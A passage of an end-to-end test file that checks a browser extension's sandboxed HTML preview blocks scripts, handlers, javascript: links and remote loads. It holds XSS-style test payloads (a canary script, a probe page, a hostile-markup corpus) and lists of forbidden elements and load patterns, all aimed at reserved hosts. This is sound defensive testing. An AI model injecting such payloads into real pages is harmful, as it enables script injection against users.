// The HTML Preview tool in the built extension (docs/tools/specs/html-preview.md): its scenarios (§2) with the page's
// real controls, then the tool's promise — "Scripts never run and nothing is loaded" — proved rather than assumed:
//   - the preview is the kit's sandboxed srcdoc frame (no allow-scripts) with a policy of its own that lets nothing
//     load, filled by the page with checked nodes, constructed sheets and CSSOM inline styles; it is not themed;
//   - the pasted styles are honoured under `style-src 'none'` (computed colours, weights, borders, margins, a mail's
//     mobile layout at 375 px), and every CSS way to load (url() in any property, @import, @font-face, image-set, …) is
//     cut before it reaches the frame;
//   - the hostile corpus (packages/tools/logic/html-preview/src/hostile-corpus.json, the unit tests' entries) pasted
//     into the field, one by one and all at once: the frame holds only what the promise allows, as Chrome built it;
//   - the layers under the check on their own, on a page of their own: hostile markup, sheets and inline styles written
//     straight into the frame's document, as if every rule of the logic had failed — nothing runs, loads or navigates;
//   - for the whole module: every request of the browser context outside the extension's files (Playwright and CDP),
//     a canary that a script would set on the parent and the top window, a message it would post, a value it would
//     write to chrome.storage or localStorage, the top page's address, the frame's address, and the console;
//   - links by click and by keyboard, forms held back, an overlay that stays inside its frame;
//   - §12: a megabyte of HTML and the pathological shapes (deep nesting, wide tables with collapsed borders, column
//     spans and groups, thousands of styled elements, a megabyte of CSS), timed with the longest task;
//   - what opens for a pasted HTML document on the start page; history (D17); light and dark screenshots.
// Every remote address is a reserved name (*.invalid, example.com) or a local port where nothing listens, and a route
// answers them locally: even a failed rule reaches no network, and the attempt is recorded as the tool's failure.
// Run by scripts/e2e-tools.mjs; navigates by replacing the current history entry (Chrome keeps 50 per tab).

/* global document, location, window, getComputedStyle, requestAnimationFrame, HTMLTextAreaElement, chrome, addEventListener, DOMParser, DataTransfer, ClipboardEvent, Document, Element -- page.evaluate callbacks run in the pages */

import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  forgetSavedParameters,
  inDarkTheme,
  settledShot,
  stubClipboard,
  waitForHistoryRecord,
} from '../e2e-helpers.mjs';

const T = 'HTML Preview';
const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../..');
/** What an injected script would do: the corpus's {{CANARY}} (testing.ts of the logic package says the same). */
const CANARY =
  "parent.__hpPwned=1;top.__hpPwned=1;window.__hpPwned=1;top.postMessage('hp-pwned','*');" +
  "try{chrome.storage.local.set({hpPwned:1})}catch(e){}try{localStorage.setItem('hpPwned','1')}catch(e){}";
const CORPUS = JSON.parse(
  readFileSync(join(ROOT, 'packages/tools/logic/html-preview/src/hostile-corpus.json'), 'utf8'),
).map(e => ({ ...e, html: e.html.replaceAll('{{CANARY}}', CANARY) }));
/** Every remote address this module may cause: answered by a route, never by the network. */
const SAFE = /^(?:https?|wss?):\/\/(?:[^/?#@]*\.invalid|example\.com|127\.0\.0\.1:9)(?:[/?#:]|$)/;
const FRAME = 'iframe[title="HTML preview"]';
const SANDBOX = 'allow-same-origin allow-popups allow-popups-to-escape-sandbox';

const MAIL = [
  '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Your order has shipped</title>',
  '<style>',
  'body { margin: 0; background: rgb(244, 244, 246); font-family: Arial, sans-serif }',
  '.wrapper { width: 600px; margin: 0 auto; background: rgb(255, 255, 255) }',
  '.head { background: rgb(17, 85, 204); color: rgb(255, 255, 255); padding: 16px 24px; font-size: 20px }',
  '.cell { padding: 16px 24px; color: rgb(51, 51, 51); font-size: 14px; line-height: 20px }',
  '.btn { display: inline-block; padding: 10px 18px; background: rgb(17, 85, 204); color: rgb(255, 255, 255); text-decoration: none; border-radius: 4px }',
  'table { border-collapse: collapse }',
  '@media only screen and (max-width: 600px) { .wrapper { width: 100% !important } .cell { padding: 12px !important } }',
  '</style></head>',
  '<body><table class="wrapper" role="presentation"><tr><td class="head">',
  '<img src="https://example.com/logo.png" alt="Shop" width="96" height="24" style="vertical-align:middle"> Your order has shipped</td></tr>',
  '<tr><td class="cell"><p>Hello Ann,</p><p>Your order <b>#10423</b> is on its way.</p>',
  '<img src="https://example.com/item.png" alt="Item" width="120" height="120">',
  '<img src="https://example.com/pixel.gif" width="1" height="1">',
  '<p><a class="btn" href="https://example.com/track">Track the parcel</a></p>',
  '<p style="color:rgb(136, 136, 136);font-size:12px">You get this mail because you ordered from us. <a href="https://example.com/settings">Settings</a></p>',
  '</td></tr></table></body></html>',
].join('\n');

/** The spec's probe document (§10): refresh, base, external CSS, @import, <style>, <script>, body style, an image,
 * three kinds of links, a handler, a form and an iframe. */
const PROBE = [
  '<!doctype html><html><head><meta http-equiv="refresh" content="0;url=http://nav.invalid/refresh">',
  '<base href="http://base.invalid/"><link rel="stylesheet" href="http://css.invalid/a.css">',
  '<style>@import url(http://css.invalid/import.css); .card { color: rgb(255, 0, 0); font-weight: 700; border: 2px solid rgb(0, 0, 255); background: url(http://css.invalid/bg.png) }</style>',
  `<script>${CANARY}</script></head><body style="margin:7px">`,
  '<div class="card">Card</div><img src="http://img.invalid/logo.png" alt="Logo" width="120" height="40">',
  `<a href="https://example.com/html/open">open</a> <a href="/account">relative</a> <a href="javascript:${CANARY}">js</a>`,
  `<p onclick="${CANARY}">handler</p><form action="http://form.invalid/submit"><input name="q" value="x"><button id="hp-go">Go</button></form>`,
  '<iframe src="http://frame.invalid/"></iframe></body></html>',
].join('');

/** What the frame's document may hold at all, as Chrome built it (the promise, stated again over the frame). */
const auditFrame = () => {
  const forbidden = new Set([
    'script',
    'style',
    'iframe',
    'frame',
    'frameset',
    'object',
    'embed',
    'applet',
    'portal',
    'fencedframe',
    'base',
    'link',
    'template',
    'noscript',
    'noembed',
    'noframes',
    'xmp',
    'plaintext',
    'source',
    'track',
    'img',
  ]);
  const attrs = new Set([
    'src',
    'srcset',
    'srcdoc',
    'poster',
    'background',
    'ping',
    'action',
    'formaction',
    'formtarget',
    'autofocus',
    'download',
    'lowsrc',
    'dynsrc',
    'data-preview-style',
  ]);
  const loads = /url\(\s*(?!["']?#)|image-set\(|image\(|cross-fade\(|src\(|element\(|expression\(|@import|@namespace/i;
  // Read through the prototypes: the content may name a form's fields `localName`, `attributes`, … (DOM clobbering).
  const get = (proto, name) => Object.getOwnPropertyDescriptor(proto, name).get;
  const localNameOf = get(Element.prototype, 'localName');
  const namespaceOf = get(Element.prototype, 'namespaceURI');
  const attributesOf = get(Element.prototype, 'attributes');
  const getAttr = (el, name) => Element.prototype.getAttribute.call(el, name);
  const problems = [];
  const head = [...document.head.children].map(e => e.localName);
  if (head.join() !== 'meta,meta') problems.push(`head: ${head.join()}`);
  for (const el of document.body.querySelectorAll('*')) {
    const name = localNameOf.call(el).toLowerCase();
    const ns = namespaceOf.call(el);
    const html = ns === 'http://www.w3.org/1999/xhtml';
    if (forbidden.has(name) || (name === 'title' && html)) problems.push(`<${name}>`);
    if (html && name === 'input' && (getAttr(el, 'type') ?? '').trim().toLowerCase() === 'image')
      problems.push('<input type=image>');
    for (const a of attributesOf.call(el)) {
      const lower = a.name.toLowerCase();
      if (/^on/i.test(a.localName) || attrs.has(lower)) problems.push(`<${name} ${a.name}>`);
      if (lower === 'style' && loads.test(a.value)) problems.push(`<${name} style loads>`);
      if (lower === 'target' && !(html && (name === 'a' || name === 'area') && a.value === '_blank'))
        problems.push(`<${name} target=${a.value}>`);
      if (lower === 'name' && html && name === 'form') problems.push('<form name>');
      if (a.localName === 'href') {
        if (html && (name === 'a' || name === 'area')) {
          if (!/^(https?|mailto):/i.test(a.value) || /[\s\p{Cc}]/u.test(a.value))
            problems.push(`<${name} href=${a.value}>`);
          if (el.getAttribute('target') !== '_blank' || el.getAttribute('rel') !== 'noopener noreferrer')
            problems.push(`<${name}> opens with an opener`);
        } else if (!(
          el.namespaceURI === 'http://www.w3.org/2000/svg' &&
          name !== 'a' &&
          a.value.trim().startsWith('#')
        ))
          problems.push(`<${name} ${a.name}=${a.value}>`);
      } else if (!html && /url\(\s*(?!["']?#)/i.test(a.value)) problems.push(`<${name} ${a.name} loads>`);
      if (/^(href|src|action|formaction|style)$/i.test(a.localName) && a.value.includes('__hpPwned'))
        problems.push(`<${name} ${a.name}> holds the canary`);
    }
  }
  const rules = sheet => {
    const out = [];
    const walk = list => {
      for (const r of list) {
        out.push(r.cssText);
        if (r.cssRules) walk(r.cssRules);
      }
    };
    walk(sheet.cssRules);
    return out;
  };
  for (const [i, sheet] of document.adoptedStyleSheets.entries())
    for (const text of rules(sheet)) if (loads.test(text)) problems.push(`sheet ${i} loads: ${text.slice(0, 80)}`);
  if (document.styleSheets.length !== 0) problems.push(`${document.styleSheets.length} document stylesheets`);
  return problems;
};

export default async ({ ctx, page, base, check, shoot, sleep, report }) => {
  const origin = `chrome-extension://${new URL(base).host}`;
  const timings = {};
  report.htmlPreview = timings;

  // ---- What leaves the extension, for the whole module.
  const outside = []; // requests of the browser context that are not files of the extension
  const onRequest = request => {
    const url = request.url();
    if (!url.startsWith(origin)) outside.push(url);
  };
  ctx.on('request', onRequest);
  const routed = [];
  await ctx.route(SAFE, route => {
    routed.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>link target</title>' });
  });
  const cdp = await ctx.newCDPSession(page);
  await cdp.send('Network.enable');
  const cdpOutside = [];
  cdp.on('Network.requestWillBeSent', e => {
    if (!e.request.url.startsWith(origin)) cdpOutside.push(e.request.url);
  });
  cdp.on('Network.webSocketCreated', e => cdpOutside.push(e.url));
  const fetched = []; // the extension's own files, for which chunk loads where
  const onPageRequest = request => fetched.push(request.url());
  page.on('request', onPageRequest);
  const consoleLines = [];
  const onConsole = m => {
    if (m.type() === 'error' || m.type() === 'warning') consoleLines.push(`${m.type()}: ${m.text()}`);
  };
  page.on('console', onConsole);
  const popups = [];
  const onPopup = p => popups.push(p);
  ctx.on('page', onPopup);

  const go = async hash => {
    if (!page.url().startsWith(base)) await page.goto(`${base}${hash}`);
    else await page.evaluate(url => location.replace(url), `${base}${hash}`);
    await page.waitForFunction(h => location.hash === h, hash, { timeout: 5000 });
  };
  const input = page.locator('#html-preview-input');
  const frameEl = page.locator(FRAME);
  const button = name => page.getByRole('button', { name, exact: true });
  const lineOf = async part => (await page.locator(`[data-part="${part}"]`).innerText()).trim();
  const preview = async () => await (await frameEl.elementHandle()).contentFrame();
  const drawn = async () => Number((await frameEl.getAttribute('data-rendered')) ?? 0);
  /** Sets the field as a paste would (one input event), then waits for the preview drawn from it. */
  const show = async (text, timeout = 5000) => {
    const before = await drawn();
    await page.evaluate(value => {
      const field = document.querySelector('#html-preview-input');
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(field, value);
      field.dispatchEvent(new Event('input', { bubbles: true }));
    }, text);
    await page
      .waitForFunction(
        ([sel, b]) => Number(document.querySelector(sel)?.getAttribute('data-rendered') ?? 0) > b,
        [FRAME, before],
        { timeout },
      )
      .catch(() => {});
  };
  const newTab = async action => {
    const before = popups.length;
    await action();
    const until = Date.now() + 3000;
    while (popups.length === before && Date.now() < until) await sleep(50);
    const opened = popups[before];
    if (!opened) return null;
    await opened.waitForLoadState('domcontentloaded', { timeout: 3000 }).catch(() => {});
    const seen = {
      url: opened.url(),
      noOpener: await opened.evaluate(() => window.opener === null).catch(() => 'not readable'),
    };
    await opened.close().catch(() => {});
    return seen;
  };
  const canary = async target =>
    target.evaluate(async () => ({
      pwned: window.__hpPwned ?? null,
      messages: [...(window.__hpMessages ?? [])],
      local: localStorage.getItem('hpPwned'),
      storage: await new Promise(resolve =>
        chrome.storage.local.get('hpPwned', items => resolve(items?.hpPwned ?? null)),
      ),
    }));
  const armCanary = async target =>
    target.evaluate(() => {
      delete window.__hpPwned;
      window.__hpMessages = [];
      addEventListener('message', e => window.__hpMessages.push(String(e.data)));
    });

  // ---- The start route carries nothing of the tool; its page loads its chunk and nothing else of its own.
  await go('#/start');
  await page.reload();
  await page.getByRole('combobox', { name: 'Find a tool or search the web' }).waitFor();
  const clipboard = await stubClipboard(page);
  try {
    const onStart = fetched.filter(u => /HtmlPreviewTool-/.test(u));
    fetched.length = 0;
    await go('#/tools/html-preview');
    await input.waitFor();
    await page.locator(`${FRAME}[data-rendered]`).waitFor();
    await armCanary(page);
    const chunk = fetched.find(u => /\/assets\/HtmlPreviewTool-[\w-]+\.js$/.test(u));
    const source = chunk ? await page.evaluate(url => fetch(url).then(r => r.text()), chunk) : '';
    const codeFromStrings = (source.match(/\beval\s*\(|new\s+Function\b|\bFunction\s*\(/g) ?? []).length;
    check(
      `${T}: the start route loads nothing of it; its page loads its chunk (the check, the CSS tokenizer, the kit’s frame); no eval or Function, no corpus in it`,
      onStart.length === 0 &&
        Boolean(chunk) &&
        source.includes('Image not loaded: ') &&
        source.includes('data-html-preview-base') &&
        !source.includes('.invalid') &&
        codeFromStrings === 0,
      `start: ${onStart.length}; ${chunk?.replace(origin, '')} (${source.length} bytes, eval/Function: ${codeFromStrings})`,
    );
    timings.chunkBytes = source.length;

    // ---- §6, §8: the empty page; the frame and what it is allowed.
    const frame = await preview();
    const empty = await frame.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      document.body.append(document.createElement('p'));
      const p = document.body.lastElementChild;
      p.textContent = 'x';
      const font = [getComputedStyle(p).fontFamily, getComputedStyle(p).fontSize];
      p.remove();
      return {
        url: location.href,
        policy: meta?.getAttribute('content'),
        links: document.querySelectorAll('link').length,
        body: document.body.childNodes.length,
        adopted: document.adoptedStyleSheets.length,
        background: getComputedStyle(document.documentElement).backgroundColor,
        font,
        theme: document.documentElement.getAttribute('data-theme'),
      };
    });
    const emptyState = {
      sandbox: await frameEl.getAttribute('sandbox'),
      src: await frameEl.getAttribute('src'),
      placeholder: await input.getAttribute('placeholder'),
      spellcheck: await input.getAttribute('spellcheck'),
      copyOff: await button('Copy HTML').isDisabled(),
      width: await page.getByLabel('Width').innerText(),
      hint: await page
        .getByText('Scripts are not run. Images, fonts and external styles are not loaded. Links open in a new tab.')
        .count(),
      error: await lineOf('error'),
      removed: await lineOf('removed'),
      ...empty,
    };
    check(
      `${T}: opens empty — placeholder, Width Fit, Copy HTML off, the hint; the preview is an about:srcdoc frame sandboxed without scripts, a policy that lets nothing load, no stylesheet file, not themed, white, the browser’s own font`,
      emptyState.sandbox === SANDBOX &&
        emptyState.src === null &&
        emptyState.url === 'about:srcdoc' &&
        emptyState.placeholder === '<p>Paste HTML here</p>' &&
        emptyState.spellcheck === 'false' &&
        emptyState.copyOff &&
        emptyState.width.includes('Fit') &&
        emptyState.hint === 1 &&
        emptyState.error === '' &&
        emptyState.removed === '' &&
        /script-src 'none'/.test(emptyState.policy) &&
        /style-src 'none'/.test(emptyState.policy) &&
        /img-src 'none'/.test(emptyState.policy) &&
        /font-src 'none'/.test(emptyState.policy) &&
        !/'self'/.test(emptyState.policy) &&
        emptyState.links === 0 &&
        emptyState.body === 0 &&
        emptyState.adopted === 1 &&
        emptyState.background === 'rgb(255, 255, 255)' &&
        emptyState.font[1] === '16px' &&
        emptyState.theme === null,
      JSON.stringify(emptyState),
    );

    // ---- §2.1: a mail template, its styles honoured under the frame's style-src 'none'.
    await show(MAIL);
    const mail = await frame.evaluate(() => {
      const cs = el => getComputedStyle(el);
      const head = document.querySelector('.head');
      const btn = document.querySelector('.btn');
      const frames = [...document.querySelectorAll('.html-preview-image')];
      return {
        wrapper: cs(document.querySelector('.wrapper')).width,
        inner: document.documentElement.clientWidth,
        page: cs(document.body).backgroundColor,
        head: [cs(head).backgroundColor, cs(head).color, cs(head).fontSize],
        btn: [cs(btn).backgroundColor, cs(btn).borderTopLeftRadius, btn.target, btn.rel],
        font: cs(document.querySelector('.cell p')).fontFamily,
        footer: cs([...document.querySelectorAll('.cell p')].at(-1)).color,
        // the size the image frame takes from width and height (a 1×1 pixel is drawn at least as wide as its border)
        frames: frames.map(f => [f.textContent, f.style.width, f.style.height]),
        lang: document.documentElement.lang,
        settings: [...document.querySelectorAll('a')].at(-1)?.getAttribute('href'),
      };
    });
    const mailLine = await lineOf('removed');
    check(
      `${T}: §2.1 a mail template — its <style> and style attributes applied (colours, sizes, the 600 px wrapper, radius), “Not shown: 3 images.”, frames with alt and size; no request`,
      // the column is narrower than the mail's 600 px: its own @media (max-width: 600px) makes it fill the frame
      mail.wrapper === `${mail.inner}px` &&
        mail.page === 'rgb(244, 244, 246)' &&
        JSON.stringify(mail.head) === JSON.stringify(['rgb(17, 85, 204)', 'rgb(255, 255, 255)', '20px']) &&
        mail.btn[0] === 'rgb(17, 85, 204)' &&
        mail.btn[1] === '4px' &&
        mail.btn[2] === '_blank' &&
        mail.btn[3] === 'noopener noreferrer' &&
        /Arial/.test(mail.font) &&
        mail.footer === 'rgb(136, 136, 136)' &&
        JSON.stringify(mail.frames) ===
          JSON.stringify([
            ['Shop', '96px', '24px'],
            ['Item', '120px', '120px'],
            ['image', '1px', '1px'],
          ]) &&
        mail.lang === 'en' &&
        mail.settings === 'https://example.com/settings' &&
        mailLine === 'Not shown: 3 images.' &&
        outside.length === 0 &&
        cdpOutside.length === 0,
      JSON.stringify({ mail, mailLine, outside, cdpOutside }),
    );
    await settledShot(shoot, page, 'tool-html-preview-01-mail-light.png');

    // ---- §2.4: 375 px — the mail's own media query takes over; 1024 px scrolls sideways in its wrapper.
    const chooseWidth = async label => {
      await page.getByLabel('Width').click();
      await page.getByRole('option', { name: label, exact: true }).click();
      await page.waitForTimeout(100);
    };
    await chooseWidth('375 px');
    const narrow = {
      frame: Math.round((await frameEl.boundingBox()).width),
      inner: await frame.evaluate(() => document.documentElement.clientWidth),
      wrapper: await frame.evaluate(() => getComputedStyle(document.querySelector('.wrapper')).width),
      padding: await frame.evaluate(() => getComputedStyle(document.querySelector('.cell')).paddingLeft),
    };
    await settledShot(shoot, page, 'tool-html-preview-02-mail-375-light.png');
    await chooseWidth('1024 px');
    const wide = await page.evaluate(() => {
      const viewport = document.querySelector('[data-part="viewport"]');
      return { scroll: viewport.scrollWidth, client: viewport.clientWidth };
    });
    wide.wrapper = await frame.evaluate(() => getComputedStyle(document.querySelector('.wrapper')).width);
    await chooseWidth('Fit');
    check(
      `${T}: §2.4 Width 375 px narrows the frame and the mail’s @media (max-width: 600px) applies; at 1024 px the mail is its 600 px and the frame scrolls sideways in its wrapper`,
      narrow.frame === 375 &&
        narrow.wrapper === `${narrow.inner}px` &&
        narrow.padding === '12px' &&
        wide.scroll > wide.client &&
        wide.wrapper === '600px',
      JSON.stringify({ narrow, wide }),
    );

    // ---- §10 (probe rows): the spec's sample document.
    await show(PROBE);
    const probe = await frame.evaluate(() => {
      const cs = el => getComputedStyle(el);
      const card = document.querySelector('.card');
      const ph = document.querySelector('.html-preview-image');
      return {
        card: [cs(card).color, cs(card).fontWeight, cs(card).borderTopColor, cs(card).backgroundImage],
        margin: cs(document.body).marginTop,
        placeholder: Math.round(ph.getBoundingClientRect().width),
        background: cs(document.documentElement).backgroundColor,
      };
    });
    const probeLine = await lineOf('removed');
    check(
      `${T}: §10 the probe document — .card red, 700, blue border, no background image; body margin 7px; image frame 120px; white; the line word for word; no request, no console line`,
      JSON.stringify(probe.card) === JSON.stringify(['rgb(255, 0, 0)', '700', 'rgb(0, 0, 255)', 'none']) &&
        probe.margin === '7px' &&
        probe.placeholder === 120 &&
        probe.background === 'rgb(255, 255, 255)' &&
        probeLine ===
          'Not shown: 1 script, 1 event handler, 1 image, 2 external stylesheets, 1 embedded frame or object, 2 links that would not open.' &&
        outside.length === 0 &&
        cdpOutside.length === 0 &&
        consoleLines.length === 0,
      JSON.stringify({ probe, probeLine, outside, cdpOutside, console: consoleLines }),
    );

    // ---- §2.3, §10 probe rows: links by click and keyboard; a form held back.
    const links = page.frameLocator(FRAME);
    const before = page.url();
    const opened = await newTab(() => links.getByRole('link', { name: 'open' }).click());
    const inactive = [];
    for (const name of ['relative', 'js'])
      inactive.push(await newTab(() => links.getByText(name, { exact: true }).click()));
    const handler = await newTab(() => links.getByText('handler').click());
    await links.locator('#hp-go').click();
    await links.locator('input[name="q"]').press('Enter');
    await page.getByLabel('Width').focus();
    await page.keyboard.press('Tab'); // Copy HTML
    await page.keyboard.press('Tab'); // into the frame: its first link
    const focused = await frame.evaluate(() => document.activeElement?.textContent);
    const byKey = await newTab(() => page.keyboard.press('Enter'));
    await sleep(300);
    const linkState = {
      opened,
      inactive,
      handler,
      focused,
      byKey,
      top: page.url() === before,
      frame: (await preview()).url(),
      titles: await frame.evaluate(() => [...document.querySelectorAll('a:not([href])')].map(a => a.title)),
      canary: await canary(page),
      frameCanary: await (await preview()).evaluate(() => window.__hpPwned ?? null),
      routed: [...routed],
      console: [...consoleLines],
    };
    check(
      `${T}: §2.3 an https link opens a new tab without opener, by click and by Enter after Tab from Copy HTML; /account and javascript: are “Not opened: …” and do nothing; the handler and the form do nothing — no console line; the page and the frame stay`,
      opened?.url === 'https://example.com/html/open' &&
        opened.noOpener === true &&
        inactive.every(x => x === null) &&
        handler === null &&
        focused === 'open' &&
        byKey?.url === 'https://example.com/html/open' &&
        linkState.top &&
        linkState.frame === 'about:srcdoc' &&
        JSON.stringify(linkState.titles) ===
          JSON.stringify(['Not opened: /account', `Not opened: javascript:${CANARY}`]) &&
        linkState.canary.pwned === null &&
        linkState.frameCanary === null &&
        JSON.stringify(linkState.routed) ===
          JSON.stringify(['https://example.com/html/open', 'https://example.com/html/open']) &&
        linkState.console.length === 0,
      JSON.stringify(linkState),
    );
    const expectedOutside = [...routed];

    // ---- §2.5: Copy HTML takes the checked document; parsed again it runs and loads nothing.
    await show(MAIL);
    await button('Copy HTML').click();
    await button('Copied').waitFor({ timeout: 2000 });
    const copied = (await clipboard.copied()).at(-1) ?? '';
    const copiedParsed = await page.evaluate(html => {
      const d = new DOMParser().parseFromString(html, 'text/html');
      return {
        scripts: d.querySelectorAll('script, iframe, object, embed, img, link, base, meta').length,
        handlers: [...d.querySelectorAll('*')].filter(el => [...el.attributes].some(a => /^on/i.test(a.name))).length,
        styles: d.querySelectorAll('style').length,
        frames: d.querySelectorAll('.html-preview-image').length,
      };
    }, copied);
    const record = await waitForHistoryRecord(page, 'html-preview', r => r.label?.endsWith('HTML copied')).catch(
      () => null,
    );
    check(
      `${T}: §2.5 Copy HTML copies one checked document (a <style>, the mail, image frames; no script, handler, image or link element), says Copied, and the history keeps the HTML as Previewed`,
      copied.startsWith('<!doctype html>\n<html lang="en"><head><style>') &&
        copiedParsed.scripts === 0 &&
        copiedParsed.handlers === 0 &&
        copiedParsed.styles === 1 &&
        copiedParsed.frames === 3 &&
        record?.kind === 'preview' &&
        record?.label === `Your order has shipped · ${MAIL.length.toLocaleString('en-US')} characters · HTML copied`,
      JSON.stringify({ length: copied.length, copiedParsed, label: record?.label, kind: record?.kind }),
    );

    // ---- §6 rows; an overlay stays inside its frame.
    const rows = {};
    await show(' \n\t ');
    rows.blank = [await frame.evaluate(() => document.body.textContent.trim()), await button('Copy HTML').isDisabled()];
    await show('plain text');
    rows.plain = await frame.evaluate(() => document.body.textContent);
    await show('<div><p>unclosed <b>bold<td>junk</table>');
    rows.junk = await frame.evaluate(() => document.body.innerHTML);
    await show('<html dir="rtl" lang="ar"><body>مرحبا 👋</body></html>');
    rows.rtl = await frame.evaluate(() => [
      document.documentElement.dir,
      document.documentElement.lang,
      document.body.textContent,
    ]);
    await show(
      '<html><head><base href="http://base.invalid/"><meta http-equiv="refresh" content="0;url=http://nav.invalid/"></head><body><a href="#top">top</a></body></html>',
    );
    rows.base = await frame.evaluate(() => [
      document.baseURI.startsWith('chrome-extension://') || document.baseURI === 'about:srcdoc',
      document.querySelector('a').title,
    ]);
    await show('<div style="position:fixed;inset:0;z-index:2147483647;background:rgb(255, 0, 0)">overlay</div>');
    const frameBox = await frameEl.boundingBox();
    const copyBox = await button('Copy HTML').boundingBox();
    rows.overlay = {
      inside: await frame.evaluate(() => {
        const r = document.querySelector('div').getBoundingClientRect();
        return [r.left, r.top, r.right <= window.innerWidth, r.bottom <= window.innerHeight];
      }),
      // what the page has under the Copy HTML button and just outside the frame: the page's own elements
      atCopy: await page.evaluate(
        ([x, y]) => document.elementFromPoint(x, y)?.closest('button')?.textContent ?? null,
        [copyBox.x + copyBox.width / 2, copyBox.y + copyBox.height / 2],
      ),
      outside: await page.evaluate(
        ([x, y]) => document.elementFromPoint(x, y)?.localName ?? null,
        [frameBox.x - 2, frameBox.y + 10],
      ),
    };
    await sleep(200);
    check(
      `${T}: §6 blank — empty, Copy HTML off; plain text; junk as the parser builds it; rtl and lang carried; <base> and refresh gone with no console line; a full-page fixed overlay covers only the frame`,
      rows.blank[0] === '' &&
        rows.blank[1] === true &&
        rows.plain === 'plain text' &&
        rows.junk.includes('<b>bold') &&
        JSON.stringify(rows.rtl) === JSON.stringify(['rtl', 'ar', 'مرحبا 👋']) &&
        rows.base[0] === true &&
        rows.base[1] === 'Not opened: #top' &&
        rows.overlay.inside[0] === 0 &&
        rows.overlay.inside[1] === 0 &&
        rows.overlay.inside[2] &&
        rows.overlay.inside[3] &&
        rows.overlay.atCopy === 'Copy HTML' &&
        rows.overlay.outside !== 'iframe' &&
        consoleLines.length === 0 &&
        page.url() === before,
      JSON.stringify({ rows, console: consoleLines }),
    );

    // ---- The hostile corpus through the field: Chrome's parser, the check, the frame.
    const consoleBefore = consoleLines.length;
    const audits = [];
    for (const entry of CORPUS) {
      await show(entry.html);
      const problems = await (await preview()).evaluate(auditFrame);
      if (problems.length) audits.push({ name: entry.name, problems });
    }
    await show(CORPUS.map(e => e.html).join('\n'));
    const whole = await (await preview()).evaluate(auditFrame);
    // Hover every link, inactive link and image frame (a preconnect on hover would show as a request), then wait.
    const targets = await page.frameLocator(FRAME).locator('a, .html-preview-image, button, summary').all();
    for (const target of targets.slice(0, 60)) await target.hover({ timeout: 500 }).catch(() => {});
    await sleep(1000);
    const corpus = {
      entries: CORPUS.length,
      fromMarkdownPreview: CORPUS.filter(e => e.from === 'markdown-preview').length,
      audits,
      whole,
      hovered: Math.min(targets.length, 60),
      outside: outside.filter(u => !expectedOutside.includes(u)),
      // the browser's own media controls (a <video controls> of the corpus) draw their icons from data: SVGs: not the
      // content's, and no network
      cdp: cdpOutside.filter(u => !expectedOutside.includes(u) && !u.startsWith('data:image/svg+xml')),
      mediaIcons: cdpOutside.filter(u => u.startsWith('data:image/svg+xml')).length,
      routed: routed.slice(expectedOutside.length),
      canary: await canary(page),
      frameCanary: await (await preview()).evaluate(() => window.__hpPwned ?? null),
      top: page.url() === before,
      frame: (await preview()).url(),
      console: consoleLines.slice(consoleBefore),
      focus: await page.evaluate(() => document.activeElement?.localName ?? null),
    };
    check(
      `${T}: the hostile corpus (${CORPUS.length} entries, ${corpus.fromMarkdownPreview} of them Markdown Preview’s, one by one and all at once) — only what the promise allows in the frame; no request, no script, no message, no storage write, no navigation, no console line`,
      audits.length === 0 &&
        whole.length === 0 &&
        corpus.outside.length === 0 &&
        corpus.cdp.length === 0 &&
        corpus.routed.length === 0 &&
        corpus.canary.pwned === null &&
        corpus.canary.messages.length === 0 &&
        corpus.canary.local === null &&
        corpus.canary.storage === null &&
        corpus.frameCanary === null &&
        corpus.top &&
        corpus.frame === 'about:srcdoc' &&
        corpus.console.length === 0,
      JSON.stringify(corpus),
    );
    timings.corpus = { entries: CORPUS.length, hovered: corpus.hovered };
    await settledShot(shoot, page, 'tool-html-preview-03-hostile-light.png');

    // ---- §12: large inputs and the pathological shapes, timed with the longest task.
    const timed = (text, timeout = 30_000) =>
      page.evaluate(
        async ([value, sel, limit]) => {
          const field = document.querySelector('#html-preview-input');
          const frameNode = document.querySelector(sel);
          const before = Number(frameNode.getAttribute('data-rendered'));
          let longest = 0;
          const observer = new PerformanceObserver(list => {
            for (const e of list.getEntries()) longest = Math.max(longest, e.duration);
          });
          observer.observe({ type: 'longtask', buffered: false });
          const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set;
          const start = performance.now();
          setter.call(field, value);
          field.dispatchEvent(new Event('input', { bubbles: true }));
          while (Number(frameNode.getAttribute('data-rendered')) === before && performance.now() - start < limit)
            await new Promise(r => requestAnimationFrame(r));
          const elapsed = performance.now() - start;
          await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
          const painted = performance.now() - start;
          await new Promise(r => setTimeout(r, 100));
          observer.disconnect();
          const doc = frameNode.contentDocument;
          return {
            chars: value.length,
            drawn: Number(frameNode.getAttribute('data-rendered')) > before,
            elapsed: Math.round(elapsed),
            painted: Math.round(painted),
            longest: Math.round(longest),
            nodes: doc.body.getElementsByTagName('*').length,
          };
        },
        [text, FRAME, timeout],
      );
    const block = i =>
      `<table class="row" style="width:100%;border-collapse:collapse"><tr><td style="padding:8px;color:rgb(51, 51, 51)"><h2 style="margin:0">Item ${i}</h2><p>Some <b>text</b> with a <a href="https://example.com/${i}">link</a>.</p><img src="https://example.com/${i}.png" alt="i${i}" width="40" height="40"></td></tr></table>\n`;
    const sized = n => {
      let out = '<style>.row td { font-family: Arial } h2 { font-size: 16px }</style>';
      for (let i = 0; out.length < n; i++) out += block(i);
      return out.slice(0, n);
    };
    const large = {};
    large.live64k = await timed(sized(64 * 1024));
    large.live256k = await timed(sized(256 * 1024));
    large.settled512k = await timed(sized(512 * 1024));
    large.max1m = await timed(sized(1024 * 1024));
    const fill = (unit, n) => unit.repeat(Math.floor(n / unit.length));
    const MI = 1024 * 1024;
    const COLLAPSE = '<style>table { border-collapse: collapse } td { border: 1px solid rgb(0, 0, 0) }</style>';
    large.wideTable = await timed(COLLAPSE + '<table><tr>' + fill('<td>', MI - 200));
    large.colspans = await timed(COLLAPSE + '<table><tr>' + fill('<td colspan="1000">a', 300 * 21));
    large.colgroups = await timed(
